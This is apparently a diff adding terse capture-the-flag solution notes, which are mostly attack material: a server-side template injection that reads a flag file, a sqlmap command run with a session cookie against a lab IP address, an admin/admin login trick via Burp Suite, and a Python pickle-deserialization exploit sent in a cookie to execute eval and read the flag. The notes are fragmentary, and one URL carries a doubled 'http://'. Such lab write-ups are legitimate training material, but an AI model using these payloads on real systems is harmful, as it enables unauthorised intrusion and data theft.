@@ -28,3 +28,39 @@ x=open("flag", "r")
 %>
 ${x.readlines()}
 
+schematics
+/register.php
+index.php
+lookup products %
+from source code take cookie 
+sqlmap --cookie="PHPSESSID=a94573086f407c68def5706973b2984" -u http://34.107.45.207:30362/index.php --forms --columns --random-agent
+
+authorization
+/auth
+client_secrets.json
+/auth put burp suite request pretty  
+(
+ "username" : "admin",
+ "password" : "admin"
+)
+take access token and then + in raw
+
+sweet-and-sour
+
+import pickle
+import base64
+import requests
+
+class Exploit(object):
+		def __reduce__(self):
+				return eval, ("open('flag','r').read()",)
+
+def sendPayload(p):
+		print(base64.urlsafe_b64encode(p))
+		headers = {"Cookie": "data=" + base64.urlsafe_b64encode(p).decode()}
+		t = requests.get("http://http://34.107.71.117:32664/dashboard",headers=headers)
+		print(t.text)
+		
+sendPayload(pickle.dumps(Exploit(), protocol=2))
+
+
